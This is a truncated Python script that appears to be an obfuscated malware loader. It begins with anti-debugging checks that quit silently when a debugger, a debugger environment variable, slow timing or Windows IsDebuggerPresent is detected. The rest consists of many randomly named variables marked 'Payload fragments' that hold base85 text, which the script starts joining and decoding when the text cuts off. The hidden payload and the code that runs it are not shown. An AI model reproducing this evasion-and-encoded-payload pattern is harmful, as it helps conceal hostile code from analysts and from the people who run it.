#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cllE3ImWD5MNBc = 'T;>TdmNm3)Z$BFSRUn-9mEE4~oMA%oySJX5SC9jFOvJq4aGF^WQ<cFDs28%kvM|VqW}(k7cAw$R'
_cmDJUFvCPgOf3L = 'xEtqE!h2ct%%Qez#^2*<*JCC#_FJeC4h0#|2YDJYW))WTabf+pTFt<==m3mJpy{WsW^7ptuJCT6'
_cr2dOsICGisDtW = '?p>MyAL9oikigy9A9loPfoR6d;JFwPGad{iPX@UraRSWapgmF~B9Vc%n6eK-^`zDP=)*0FD~$Mg'
_cuV1DNrtX8i_cW = 'nK(~J@hEaTpipZ`$djxzcw$5<l9Dfe5#hkP%K@C{puq3Zd{<9@Mc3b@*5aT~>K(*yjqFyc!goLU'
_cgRb6gmHvwM7i0 = '{R0(K|5HLC%-PzpC3Fs)C>GYgSW@^aj+90x>jy|)xp_lR<jaPm&VRhZ1nR?U;(!C$3s{X|B%h(0'
_ckpGTGsagM8SIe = 'yPu4hhf{MlV@u>+g4br^+Y(i0&M<Ax_Y<gXo=Y-4Nn1hHj+{3XPMCs}bHTIUBPO#>8EU`{WRsF;'
_cg1EZdTSKiqx1A = '?&<0-W3wbX2XI>^(T@iae^B^-n(e8R-cxe`4xbhvW@*|eoI?AdJ+)OzIXm#B`U$JRf6)UnFfGl;'
_cdvbX7H0DzCKuB = 'e&-+diS0#aOj&#NC<9xJF4-jHVvX3Yj9@|i<^1%J^iv`X{|2|)K>evsd;`WDt|5xlj*m2@+(jGf'
_ct9FHGL37saOy5 = '^sK*i1npz~=N?YbkzFYK!u6ynrL);0`At!$;I@~MG}z1Dz7MLH&e!8%hHs&gOX0a_B$)H`+573O'
_cydDxta_H39EFU = '*X{lZrnpWCCz7`{(6_d1O=<s(Zhp-wDE=Zp&R9%~bqT28QPcj@p~<$Dmn7!KRh$8iF^Ae5IrcmG'
_ccDVWiIRauksBO = 'xOhPQ5_hQX$s>-lzFJt)_y(5eka_^=d~yRQ-)Cioicr`yF&n<4rof48q}2!GbBkej-3>yKi4PAl'
_chM4nglbye_PTL = 'GnQN63*4XAte`9sP0V(gzHs`<jGAfU7-4du4wi_^e1?H*rQ4*|u^equxL!VfdYy)LeVMbmh!huz'
_coE15CpBbzSoeD = 'NFwyyTb^meVM0Siun1`OsB^9fm}%WHQ0&hGTt@UT5tTT}LC+WT`sxKIwg{@oFja=~aZBiRZv7e~'
_cit4OEMOl_u4fg = 'sB%z!a6K0d{Yd)TP&DkAA}Qcf>)IJ2%J1`&0gtgfLUHU-;bTp1b|JC^F-Sl?S4<HE?^*<<jc`1a'
_cxpWqaVGYNiUXb = '(mCX^g<4|Zxe3+2K(a`<73o;`MS2D~2@-1zgT=R0Ze!tFxcB2;L`$U`ll9XOE*4h|VYka67#-cY'
_cjfipbR0fL96fV = 't2a&zBXcUhmg66xJ&7K&4ZE6iIZO3L1V0KNjLa%h^DzT=55gQ%sIi9n2M-h1-qhNWZhiGO=enqC'
_clUhjh6MCsBR13 = 'ji4%dMv8kY!qPI31spxdZmiN!YdI=}wylT9@lkGrn!)y401@4`$f5MCv?pCK7y}4gE{Hw?PnGOz'
_ceS3YFsk5EH9uE = '>M`e0zsowvz&(t3)9chz$$p<Exu$DQ+jkV=nmjfLZE!wvJaFh(isS+(AcDaW3;fa32cG^W9KCg7'
_cdzMulms3n6nta = '4;K63irdS|mSkqPAD@8((i*|Bmh=5^S7yZ|Uk$}QxOv?DT~Tu0X<}toR@-x$zRuPw4fNST3T?rv'
_cm3g7kJM_wtkdo = 'niGobuiBDkg-}hC4*5{Du#|4lEu$o(A&ofbCu*s~KF0MyBlh3_bx<UEp;*svCdd<G8<mDQ=TsJ3'
_cg69BYGQw6z4DU = 'xRW42i#rJe@s>wPO<gmM1uu@RVOM4&qu#SjIQl4XPrWPyZ|EW?H|=&Qt=<=)5v}`!AER=ofra`<'
_cmloypawsB9U3M = '=pMrrEK8I87((Hj`ku#t%SzEVtJ)PYOD%i{JTy$!^AeFCQ|&NA7}~hDV)X*Yn<9i&8eby7Ln=|}'
_cnTjfZ54qVwfBx = 'W3i5jEK_~2!blpi$DZ642=nJdTM8(O$kimzC11ap{rzLFilfVt)`;0M&aKQVt0DxWy<$Z0v)6xv'
_c_2HtXCJcmZBTD = '8TB4#DFyaQ)?H90&;gql=x~V`te|OIKvJzUv!cWUaRkZKmFsT7+Qc>I7zyKr%QVVb21mJ^7xdJ`'
_cj3SHl3T5CUyiy = '2%|RT5aJ7rV-eeP6uQW^?u&Jw-m6PC;ZjPXh#f%_oJRJylLV?OdeWA&fJL*;czF9Gae9=C)ApfO'
_csbUzJMXLOYxy5 = '%5~1&8&KhC?j0^PA%prZp4#udznM04A)Sub0(SuZ1oG6|Ej)5B!QG}W+yGoN{s+MMM_TEVF=P};'
_cpgaEQt5Tm3ozj = '-EI&KO82|MWXwZ;+Yss-2?!QjDcXQU3UDudO>k3{azTLi{7sXxJDu}hp71UU$pb?xn!`ioVD9v{'
_cuoPbg642NEDWJ = '8Tykh!DOiX7T`Ag*w}_i<4Ez~ZGYM`RXXCDEXY!A3fDF=^d*@I?JBc8igv3TQ%~fJms2ZvY66_O'
_cgNhKNHYO_VpNL = ')IiSCP|xS_rhNPICHuo~+ke(2!5)gVfW0zekxE}m1?S0LQ&9~MN?vUc)aGrY+k+|fON51Yj<zkW'
_cu4ktl6MbLZHD5 = 'iMWza1$gd`^nten=*3O1g9tJl#PGFS)@zkU-Y16!AVvmp?B)5ZHimB7k-WupI_T*7xp<%jV6#So'
_cj1zjLT8GiOuyp = 'zAyaO$A4D%?bPnjdtQ8pR=ezbSb^7qs8My~(l6y!6Vs*yzphk@50VZaPqxPdi&`j1qa)S5LdYAD'
_cvrLICn4AVDb0B = '0l;U1<v(ewZDqA}%{KI*tErPajvVHrf6I7hju1viaB(&0QG-MyCUTay8>AAL;n6dSvJvYNHQ){W'
_cbDNM1WrkDkBqa = '0J8ui(uHz=vn6)h#s1moq6upmepD1DjzOe2gS9C&QD4FWdo&K}tj#t=<Am(;B6W+^$L*pCRN$4C'
_ctWj1taE9UWuJ2 = '2MI&TR~$eDziW2PLVkFb4xaruFPH)|2h7MM&&7B2m&nGtYRyEnjrMS$u8_wAV>YG|Q!-Q_aRLu;'
_cn4LTbJCJ8CUG5 = '>k<nChJHD<G0Wxf5CjgWhLg_i(3LwjgLJh;x7V&xi(J(yFkU6*3`zvha_kW%&GJyP;;GdPfN8uP'
_cmw5b_p_KqTvxa = '`<`y|^9VA7Ws^neL|T!Keb@jAoYQ%&O(yFWrQiN3K4qX52mq@gCMB_oNR*sy&ow6EZT`HZ1~RH<'
_cmUOONO5IFVfve = 'Mw;_eYT|B1VMBv&)vH09k5ab-pDqB^(I&Ec&tzX7#OOR#+gv)kM!|S#coU}IYpwBNo>;B<*Uv1H'
_cleLSe5lNgBFOm = 'XZ|3v4ey#~Mo-~{2|ITQs1wQbN#yHxNoMoDX?yg+bJSJbHY%#ZVK3*JJz+B(d4!i%&Ik)RgS0(='
_cztpQe5Mmux8Ta = '1w}o19-KY7y2dw`jccwAwBbf-TXmemV>DrpcbMTV<5VowxWon+A)d3{mZ98vPCQ4=%!{i=og+>C'
_codqokErKjUxQf = 'iNctJ9B3p=tcHKvxP+)aZjhy5ydz#x0bgLr>gOgB>IL39(ggtZa|(mXVtKMrAjpHjiXRk<?M>lX'
_cu90BwKHdS7JWL = '#W%uKYKfoT(U(?i$~y($c@Q1q#^(=fe3@n`;Jsx2MpfGD@4-=z6SzYOi;o2E@xD!uR&k!3_`uZ<'
_cpeVAosT4TZO8F = 'um~vBO?k$?$J5Gz%!Z|l9{y{yn>*~R7KA;)W$sgpi~1m0Z6i>tU^(&~gBobm<)*|Y5r@Q-=Awz#'
_chhlHOqKJH5yE8 = 'CBVK)w_H&Zz~mDE6T+6cKP_VFhY#>F7&2<yEd4}Yt9MhRH+gEJ;hI>|B5)dcw&fnhgNA6wz}k#q'
_c_GEqcABEVe7Wi = 'j@aRJ$md)Qg7<C4OD(j<Pj$<(Q^04oJWTDb%C2Pp@;V*nH;Eu~s{dUl^YY_9b$eq<YW_!pvg=M*'
_czE1gA2LjH6u6W = 'O6~f+#h4-CsW1V>RD}^Nr5CcWcErXCxGCz!#cF+TK>;xjgi6Gc&-e1@NVkU#WV;xM0~JEIX}^o?'
_cpBDPBE5UOvZSM = '6+2=uVB}#aubcN`tm-EH^sZWGYo4@of5882Hf7|v6Qo?G$bLK|i_?{=JiG=G2R#L-1WAY_+8Qo+'
_ccDLPRggeL5OLs = 'Cr)h$V!S$o)|>ZDMup#*<ueXwfUR)e1DVDiFpCOU>k)?pd_^Y6+c?lWMro~Ge|c)j&NliKNDSs9'
_cdV2O5LVZz72eU = 'JeEDoV!gn+iPWAjQO4$4BHIRd9Zt_^2v<N7QPn>d)V{6DNORwF8Fxw|A5Bt5V8uz`;pnI}p9uI='
_cbMvBIIpt_Jxww = 'NFq#~2#d0@_a=B}6*~DNeXhQa(9cJXB{(+`Mud3@#IAKjY-;L<7XK=ucN-An$Kw<Kf<Ku+n2<HZ'
_cyCH6eq0kQr1MU = '3;)RmpAGQj848zasrk5jPX{X2=)7dqrN8oY!EF&|YdQgW?UyqYPOhg{_g2cxnI+Vwy1kX+tr{+4'
_cmAll_wDZ7gIu8 = 'oP2C?W_D6WnTYm;GSkMn^#f2l5X5~#aFA^)5AER(kUUkb+6ycecceyK%CuV$aA^9FcrNVi)i+eb'
_ctaIktVDA4VWqC = 'wFjj{N+J^ET;JN>=D*Gw)9rP-%Av}s&lc+omeX37I@bKK+TU9lrZYnj&w2ZDyu}1>W>6!NmhJR&'
_cyIEkxd_X0xh3v = '+3Iu>V%(1vK_?+92q=J6;Vah^E!`vB7m47Sq&z6N%rp6!Q->Ez6{pM$H+p4hJf5TUMg*{_Joej@'
_crr7gBC7OoveuY = '71MQA*a&+P`4h{5F%U<52>@aVSz{JXYdj-o{vF$cM`!Pl`Ttsf@FF~|b#TB7xWp#pJvRR2Ovngy'
_cxmBHqv9pJMV0y = '`k{P%;>H<V*vT-r!jhh;dQJP7e!)S~<237j>hZ^ENp@Lnm|}z6^bQu%@4?4ehU*QBfrL$R4qUIh'
_cz7f70O2dCblgv = 'ah!C*<#L}2OREFzGp6hv@fZx|@UC1P4?YJcMcqzx!Q>6m=wWMVO6jwT?pQnQh2@G$6D0?;5n}m&'
_cnmvDArGIulITR = 'hNrH7M>g4ywL2kwOR7%zc1BmC1@I=^d3;Rnal(|BHK&3kwnViXp89b&XJ}!tw`TNlmKO}ICz;so'
_cqkFZpahsJ8Gsy = '@BXqBiW<f1r*0S~WZy1(gOu=P(E5|!Ah5><zPsPw{V_?o&@?=0tDaiPd_UIcmK#9*QxssXhxzK^'
_cw2dLWy6rfsGF2 = '-eY7F+%*IowOHtGjHP742$=<0A^P%MG!Epn+ar{8;^rF@HmU<Y;Fj~%0y9jN%aRX%(5#}+Hs3M6'
_cjuNOynvXFMmSs = 'x0As3r3=Or4EwJUO4cz%W1$d(3;KOtptR-XL|z4066aXy$XVBhpz^DrB>c2vL+l?bay#Dzes%&`'
_ck22Ywd_4ObIhq = '6WWqsL8qsR?Xwam=><Luq~|Vy0?W{}8)58FkCAi3-K5=rAq(21U;i^n2Itqk&u=VtAQwNfm>pzu'
_c_x2L9vkNwYqN_ = 'fX|=|Z1)sKO@P?7R3MQxX8JN2IuVt7zEQ~%pH|I42ojjW#>t2p);muD<^xM1X6OjA`L_r10D1>O'
_cl1XIqsB5WgAJN = 'w~Lj$Ojg10OrB$Ft?>%ZF=Hmql^YlOhbO!<uC#Q6`e|j6o+0%bT-34t3gJTKokGh))Ail`jthdy'
_czfUpck5iUrrDT = '4uKpx67M~>C%GG>Die-7bjd*hF+R)dRB_z3SFFbUg3}iluh=N{vFfeb)t>?fy8a!<VOs#83&6Km'
_cqXHzDiPux6VtT = '>OaQ%ND4&qJe|awG5l#k^Rc~moyJ9Un3Km`+UHUL;rBbfsAAW;l5zY#AV;Ih8mZvmtQRp6pwPXJ'
_ccH9AhMeSzq6rb = '=A?2^s5Qow0ph?Wq$7^dX3R)>TPpS(dU}~-0nv>Tp7Kzc0&pbZhRfm((DJ|;(Ai|!y>R=O(XE_l'
_ckLhV5dGw_8TgT = '!CAQFwrS|_aa^uIVxY#<cdHn$VZ6A$fyDUlI<RNIB^jH>Zr+@E&h+!++R#bf)H(b;1D@WvR4367'
_cja3qbpO4H2gS3 = ')d6>QIte+!;()Z=@a}y<P+JW0o|<(<3rr^W<jb{JMcoB|n-aqXaGq1Q_SVn}gQf=w2%J&5XB%Wt'
_cwxyD7OcKHabze = 'K@DqZZ<p6%BoKEe_rQ%<o=o&eOODjHNlJr{>6Ik=6ue;1kmVK~$3^OF(sdmKSX9Iwj1Cis+G6Zj'
_ceKuFZ1SibSm4E = '_A5dVp@=LShUfWqsK|Mwp^gk@MR!T76WgoOJO-HD@h*rTd4wYq<pr1F+@iJXaDkteJ+@h1Ix56T'
_cc6BoUuUuUL1xL = 's)D~K{GAt_EI6rDRc=cAj8keq*D(B9?+qbk$$9I}IOVK;9L4lhB>GLz@z}JIbpvn=!X_7X6C~`-'
_csUvjD5G5KsKTx = 'K3XV(a?%@%?bO$7Zs(D3`8~_VT6+tXyj_&Sn*ibO+f#=aGAh;H^>xGw1_=of%9^#EO!|v{#TJF7'
_cyFnXaw77FGRL3 = 'Uhaxb;EYn$aKri3tCPEQ=r#l~=P63yi>aOe>Y8tuXUyk>`p~F6oJov^oQM_BrU|agXoL!F?wVse'
_ceoL4iYuBW9RyY = 'LCdd4tU1-hNDa%wU{mZ~P(>j<7VbmLOP7h4=^jDog{SkFT`{Rw1Ij+pkn+m;y~N@f-}^-SC8N~T'
_cgb1ouor6yI3J2 = '8Zt-4)`Rq7vY>b}@agp}Ltp&(#S2KoDCpL`u}XiwMiQD@mDc=Em9JRMZ2}Jo_fi0QrF1$1oPYx^'
_csTP8U2taYC0XZ = '?dvl3>d^_b5PR~b$3RSZuyU-2pH1`cUm3T4QIaxSw>!Pm$$^39gG`Q&=cpdboW}|SmMjNs{l!4O'
_chlnjsbCR8tpuG = '2Czm~0Sx%(I4mtIQR=m=>=e4b$~NJShMJ0Hbl2T5yHt%73$qEV+qpxx0WY{0tiP=j{D?wqdiu3S'
_ckOrwzJRiUUf0d = 'F;oc|I}yWY1=@CZASIhbZv!BW0Z!nOl=42}D*GO3%(rRhGwmQhN2=k_Yt7u;wN+Wtl_cs<aahY9'
_cxQ1HzEvAT34t3 = '(wv^szR-5h>EQKt1Br6pT5&%jbgf@@R+;CU{R&;0TnUrkU?$JycKHCUl<?mR*3DXcsdpy4m=wy}'
_ceidAZv5UDa_yI = 'gOh~TgSMJsqb{M6DmD|<<lhgxv-`Rb71BZR4KHa+nN%sPSUAZmvtbTvIRx+Zc_4uiDo^_i9080y'
_ceew1RqXvwOGcQ = 'c>8N}eayi6Y<3V1alRLZQZC4Rb`opLjGjZ$-(8`<0DN8BkVo(BkwF#*dbF+oNB-J>L77A_#dXkk'
_cnwxBemLprul9R = '5h7;DHW0mHm>7-+W)n+$jG5De(Pf57;Izk|by9o=0;~0r(V%kwP{ELnFHv71u|89Y-wm^n8-F}C'
_cotl6Vrm2MRCOd = 'qFS7l(qk<Z5IUXOn-75@f}iD;LesUXSgcDm4f@y%c+)VM-zQA;kQsrqgyr-}zz~%IaqPT+FMQOS'
_cn_xWDPfUj1XF5 = '5r=8Y$U4Jsh6U!A))c0@cQlC7hwZjp+fZ}<iEHM?Y8$SrvC7Lc>ccTW9wm=5B*bYxbsg(~+Pm_~'
_cxlI5hZPD4jKOo = 'ueTrg!fmCGkTg&=q^U0&BwnqA<rf=3UD7dA)WYjkbZu6yBOI0q!S7+W$nx)hOyLpGt7c0V3~fM7'
_cjFOBuXni9vBxi = 'n`;IvxPG^@obN<iN^Z+|Qj-smqYs1SLuY}&)V7eS5hxo<Z>%TKSW$?O!0G-4Y@cmpQx}f=F`I?*'
_cwwspsEPI8GwiP = 'YMw@-<=9i+YtMyKOzV2|qkV?D)a*}vRGppb>{sdlG4fTtU7Y5^%UcGj3Xw(mFKx5;1hG_&Tt>8d'
_cjJMybx79SD2Bv = 'dAI^<2ah4=LIp`vLkIUnpbKO)vx*@uxuohZDzNWdzsdf;m*P1VkOD?doIr6!E1|0<^-|9UALl77'
_cxDwetuwvw1vc8 = '>bl<lmM%V-Yb=8SB%)lF!A+{j$1pdOARRwo{bU@lZ_JHJ#qre4?*I%i`uh8QVETXbEt&)EB4!nd'
_c_5yoOkt9AMTFu = '?J-5Axa=}4!z`r2az;rsqG`JO4)A8C+8Q^4eKm!?8$$Yi``t*IP#yq>n*?l0#=FDvZz)NV3kOc='
_cdXGmBlnnRQOaE = '**FUv&xx5!GU{5`RNkWQV3`2XCFQ&7i+ir>k3jVk82bWW`oOVz{(FU&EDa%Gcc%0u3CBupVo+>C'
_czkLyQbhTnp2ky = 'j}Q;y=S8-TiDJ$`iFxuwbx<Uqf#jmn8Q|F+KITg+>*lyaTxDT0437HK5{Gkk2$Ew<IpnJ(SS2c>'
_cz_pn929wyApFf = 'KNq_EU9Lp(3<*S~d}b5tt$Olfr*!JfAyvWdNYQDD*mbn?BbWP*7-U9>P#J0ai|W`@jv7iGq}FOR'
_cho9E9yT9JuXgm = 'S`79>*jx!+1t3nX@#a_~SlQXOMPX#{k@43NlU%rxQspLAduf|{rLjp0PRU<0>s{hO4m!PyXw$Vx'
_ceXwxyINBNT_OL = 'q9K4@VhS)c_a%jOWuuUdLmwtx9mG6WH^`%C&ecMIWyOJXZe0e{K)*0e$?H@N@nG?>)wncBz<vsV'
_cms29rPX04GUb9 = 'j~|c${_JBZ+v|}0;j;$^8k9H8kXftY@yf~Fi&0|Apv_QN)P(iK#Mx()laSjOe&Ll~^YfNPvvI+O'
_ctGRwX3a3KVSHo = 'XtJ&Ip>Fv;PAS)o65SaW5hh?M*ld(?B>;wsj2qSGqr9(|aD#_Rs9_u=MtsYNJx@rX{rK@Tvf7d`'
_cuY9JPTp0ASTZ4 = 'Qu{=>?MnzQ*)GfkPU_CR8p?vDoQOOF?5`K(Znp^ro96$+ARA~@b??v4#MxF?dK!!kaF?-`@`<t?'
_czgSuJFUYzkmks = '#OVWmfoBYX3XWd84oM?WtMn`z+tAS{`I_kOhvQu<{p9A%DK`vom86@$W34Ogg2=cLf~#T)X(Xb_'
_cvH5u29vgFjEXB = 'Vj*SA@pdR}P`NzBf$+enRSUE0H(f@fTI9WaVnsYjU=BzyUyswe%;$k78gsE4RU!3$@w(Q_X|Gmk'
_cw_sIiha7Lq8Zf = ')&uO`NZ|PAIY|Zr_b@B%{J(N-AGclZN2`tc&^IoHb%;r`VLpVPTIgdQ2l9?*mhZDVti!pq4JG4x'
_caIjTeodTohcuQ = 'x9#J$%_oX+^g!KLp1Q(L>bbFxSZZMa!L#eWD>xYytzt^{!vezP)V(nY0_5Bh16Ifp)F~wh7lT6|'
_cl2BUFuZNpngZV = 'k;hWfe9x+Qv1%wN3NNATL8-=jE!z1`@v3TLhlGH4ir!0YhlEK|IKix^Smg2RaC5Chlj*_a9q1V|'
_ckexd83bkTEC6K = 'Ja2;dNUI^YZX7#;=91pnI8<vz!sqC|s$#)6I99~wdwA|ZU22LixbCt;^YUh_f*K(A<QAy2-D2q0'
_cihG5T9bZNmNBe = '^Z$VRUjfoJFuJ73bTT@YX|ix7gkFfd@ysiRKb*nOws_~>-_w&Osl2rLoM8dB_0~m9c?Q1uc&?nx'
_chGbDUfEwpiNtP = '4;n5W8_~=~OiFdD3kQ|O4yMA4hQmG8<?_YPZYweLnUMM~@=ovc2JTeKh6sL(Z$7o(9R1g^3GuVU'
_ckYtbt26ECSpXO = 'vV$Fqvj$(;Vgk8|HJ!h{>Iv|m%>uqALp7#mLT9g<3;PZW<%iso9+BCEvP{ti=y4yuW+Q=kn6UVV'
_cey45QvaiQGBc2 = 'wed(`Vg0d2dd+h(Kuq4IX57aC@Y&2?0Yo1$mQSRPr?UKll1@)|8MmbxFj#E>4;8c!Bp0Y<34MLP'
_coXkTOPDqDqIW1 = 'Mp7-Np?YNP<dlvF5PL!`!=^z0<7`-Uz}uXS5*gsK)|{hBCa<15_h0OLM_t#!(#u3r#5325f!4Q0'
_cw2ArGB3xVviiW = 'Du1h!k?pulQNh}SA8B;oyV)Ty6~ssB7Jbyqc;Nu6Q8(>x<y@$BkL0ioBAmSC<jc-Nqxq%{XM%H4'
_cm7714pVdWeF7O = '4Fib^5dz{kB~}C2C;fqO4gI4~I=n(CzeIfkXy3Dd@f&3FR)5d4(2y}~&)Fu-Jj$M@rb=+32`JMB'
_caJoTCTIaqnrZQ = 'lHruQT-T<t9uRByJe>`#7kVtDvU{l3n;)(NcVbg+^ms~n9g(MOIABi+uea>atE0%0$w0AlKJKJZ'
_ci3wRhokzwpvkM = 'gpTJv^La7ghe3UJL$u)BqWJma%K2;{cyDbj70?4EH{vFX1eK;FmuLv02{EOms2?{&K)2W9;{vUE'
_cl2mUPFAgHXqX9 = 'w1x)dtbR1=ltg$^DJ9?Nma@#-s<1PB^6}A$KS@f3#G<0#i9po{t~YK{<r~4=UEst0v?)}B*wzPT'
_cgjK2ioxIpFK8Z = 'C2D;<l7rA1VBTTVs2{#;!77+K@Nyg_j6X?;ICZrFk&o5SBz5G^*Rw|_s&T-`Dkxe8p-q=NHeA;s'
_chWzk1orxj3gZM = '4s{dB%qB@D@cnsFD|<u?eBswqZ$IPk0>aFw+G;@^d$bXl$=aZGs`--_Sr-`tSEv(p(2dq&LQAFk'
_caudravknsjptN = 'y=6UoT2c=mONYgB?bm8PLRM^}pglFSV_)t*nb&dT2@#7p0Z6fD_ZIgi-=P;hB06Pn0S#oK@lXa>'
_cjf3NppWqcPkaX = 'et}32gEPoL5^~KcR22~V2i{iXL`F>}O1Pj*qJb>z6~jj8#_D(Asvl$SEfz^e`u^xDQtao8Z9Bdv'
_cwxTuFj8M_bKCp = 'Rrzr0ar3JBe$6W8>?gXVI`cc;u5r;ybI)8i`*a9U+1Iy;n@n#XONT^(G`pkGaIbiciMtz}H2vLk'
_ckIWHdZN01yr33 = '8r|_Yn1!KwgiPpwNbHG-rIgqZWCnW7Zfs|x9-hX9J#Hu#AYN4$G|F)64;b$2j_(xAtOXD8sorHI'
_cudMBwgVFnrO6Z = '36sST7Vin~iyK3gdD#4;em2LMco_T>QfD883Ir^56P+_uf_tF}LUASmd5^DZzUDz6p4HOTG^HH{'
_cwNYswQ69jykjT = '>JFjLm^g>8{c0EECPwhiZeYUKPX2P{1+BG3AFs@+f~$3|BIABba!3<dtQN;ZL!m@}4@f!Nql`EN'
_cfOdbqlOTA52kO = ')8YCyY1}h9Yx6gsKnxuC$Vs!`o<IIs^=@BNKrJv)fiS=hW4uHru>H4_I59GtQ8!3@@~?W{qXQD}'
_cxdry5qBlYSBeZ = '3q!LcW_%a)LyN)&{>@jUYnGNaPC5Cyqv`5XCGyCmvoeQfi`lj_pcHZYtM8+VcTvW}E`q4s3I6MB'
_cdIs3QWW4GpvKc = '_oz~PiH?rpOw#vNgw(OQ#VnYq3%4$L3AaH~IrW<sVnQ)K&5H2vhC=d#2m@G#a1yu-a1zF;q<HXl'
_cozf0JBfqIAb3t = 'eFIx*XE;&IKcf7qx-^UfVYh<~WZE<c>s`kchtX0oNCuMtXx+Cy&M5k8y4V3^FIWl*-qeaPA8z0z'
_cvm7JekPZGV8oW = 'XXyzZ5kI_8TT%M5gsCL?cstL7Q~Od8g^@usWkaEw`+|{FN#H|A*O&_rwfsC(z|!H(BkD^iuQ-kC'
_ckx0K_uh8J4JC4 = 'b@JvbG}>-ghJ;VmEnEjC8~97Y#i9P%Xfs#x#yH)(KD#>SWOX5oLer;&3;UHSPGlJ%I`<JOVz9Hc'
_cbzW1jOam4PM1g = 'AV&s;_jy@(Au83cc2cj^`(xXeq@2C=n6tufp^BScmiXVZG`du4l~_kGBgmGFZf%i*+RKV$!X7Ae'
_ctystIw3tMQrmt = '4yP(uW~eUoyK#ON_5*pcfq1>96-yPe>=4)VZUuZ@=D}X0z2IdR&z-pfO_iZ82jg2Oc$X?ZR!3hD'
_ccNi5I7qyaYL9h = '73W{F&S56$Vh_Xt6_fa~)3%+Jxw{MYsQDs3?gftAfvS+X{?OJ{H5axh=+^BDYOH&T*fKU?AV~nx'
_coBFdaxW2Yk7VD = '|DqFgp-E3dasJbDm(0258Sc_u^6+}Q;{8dMPWiFoHDPub{pq4#@H&TVjsyA5dCA}gP&QFp7+?kg'
_cfNmAYPkXvW1fH = 'p6_*xgUM8tXleAq#2@UQX}Qy%jc!Xob-_?mQ(QK<n!MP2{|D!f=ik|LDO?A+7@}voc}S(W!^j@s'
_cbjAo_1CVY01A4 = '+rY+;dH'

_plnJFUaLP3iP8D = __import__('base64').b85decode(_cllE3ImWD5MNBc + _cmDJUFvCPgOf3L + _cr2dOsICGisDtW + _cuV1DNrtX8i_cW + _cgRb6gmHvwM7i0 + _ckpGTGsagM8SIe + _cg1EZdTSKiqx1A + _cdvbX7H0DzCKuB + _ct9FHGL37saOy5 + _cydDxta_H39EFU + _ccDVWiIRauksBO + _chM4nglbye_PTL + _coE15CpBbzSoeD + _cit4OEMOl_u4fg + _cxpWqaVGYNiUXb + _cjfipbR0fL96fV + _clUhjh6MCsBR13 + _ceS3YFsk5EH9uE + _cdzMulms3n6nta + _cm3g7kJM_wtkdo + _cg69BYGQw6z4DU + _cmloypawsB9U3M + _cnTjfZ54qVwfBx + _c_2HtXCJcmZBTD + _cj3SHl3T5CUyiy + _csbUzJMXLOYxy5 + _cpgaEQt5Tm3ozj + _cuoPbg642NEDWJ + _cgNhKNHYO_VpNL + _cu4ktl6MbLZHD5 + _cj1zjLT8GiOuyp + _cvrLICn4AVDb0B + _cbDNM1WrkDkBqa + _ctWj1taE9UWuJ2 + _cn4LTbJCJ8CUG5 + _cmw5b_p_KqTvxa + _cmUOONO5IFVfve + _cleLSe5lNgBFOm + _cztpQe5Mmux8Ta + _codqokErKjUxQf + _cu90BwKHdS7JWL + _cpeVAosT4TZO8F + _chhlHOqKJH5yE8 + _c_GEqcABEVe7Wi + _czE1gA2LjH6u6W + _cpBDPBE5UOvZSM + _ccDLPRggeL5OLs + _cdV2O5LVZz72eU + _cbMvBIIpt_Jxww + _cyCH6eq0kQr1MU + _cmAll_wDZ7gIu8 + _ctaIktVDA4VWqC + _cyIEkxd_X0xh3v + _crr7gBC7OoveuY + _cxmBHqv9pJMV0y + _cz7f70O2dCblgv + _cnmvDArGIulITR + _cqkFZpahsJ8Gsy + _cw2dLWy6rfsGF2 + _cjuNOynvXFMmSs + _ck22Ywd_4ObIhq + _c_x2L9vkNwYqN_ + _cl1XIqsB5WgAJN + _czfUpck5iUrrDT + _cqXHzDiPux6VtT + _ccH9AhMeSzq6rb + _ckLhV5dGw_8TgT + _cja3qbpO4H2gS3 + _cwxyD7OcKHabze + _ceKuFZ1SibSm4E + _cc6BoUuUuUL1xL + _csUvjD5G5KsKTx + _cyFnXaw77FGRL3 + _ceoL4iYuBW9RyY + _cgb1ouor6yI3J2 + _csTP8U2taYC0XZ + _chlnjsbCR8tpuG + _ckOrwzJRiUUf0d + _cxQ1HzEvAT34t3 + _ceidAZv5UDa_yI + _ceew1RqXvwOGcQ + _cnwxBemLprul9R + _cotl6Vrm2MRCOd + _cn_xWDPfUj1XF5 + _cxlI5hZPD4jKOo + _cjFOBuXni9vBxi + _cwwspsEPI8GwiP + _cjJMybx79SD2Bv + _cxDwetuwvw1vc8 + _c_5yoOkt9AMTFu + _cdXGmBlnnRQOaE + _czkLyQbhTnp2ky + _cz_pn929wyApFf + _cho9E9yT9JuXgm + _ceXwxyINBNT_OL + _cms29rPX04GUb9 + _ctGRwX3a3KVSHo + _cuY9JPTp0ASTZ4 + _czgSuJFUYzkmks + _cvH5u29vgFjEXB + _cw_sIiha7Lq8Zf + _caIjTeodTohcuQ + _cl2BUFuZNpngZV + _ckexd83bkTEC6K + _cihG5T9bZNmNBe + _chGbDUfEwpiNtP + _ckYtbt26ECSpXO + _cey45QvaiQGBc2 + _coXkTOPDqDqIW1 + _cw2ArGB3xVviiW + _cm7714pVdWeF7O + _caJoTCTIaqnrZQ + _ci3wRhokzwpvkM + _cl2mUPFAgHXqX9 + _cgjK2ioxIpFK8Z + _chWzk1orxj3gZM + _caudravknsjptN + _cjf3NppWqcPkaX + _cwxTuFj8M_bKCp + _ckIWHdZN01yr33 + _cudMBwgVFnrO6Z + _cwNYswQ69jykjT + _cfOdbqlOTA52kO + 